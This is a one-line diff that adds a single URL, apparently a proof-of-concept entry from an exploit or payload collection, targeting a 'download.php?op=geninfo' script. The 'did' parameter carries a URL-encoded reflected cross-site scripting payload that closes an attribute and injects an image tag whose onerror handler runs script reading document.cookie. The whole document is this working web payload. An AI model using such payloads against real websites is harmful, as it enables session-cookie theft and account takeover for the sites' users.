@@ -1,0 +1,1 @@
+http://www.example.com/download.php?op=geninfo&did=1%22%3E%3Cimg%20src=x%20onerror=alert%28document.cookie%29%3E
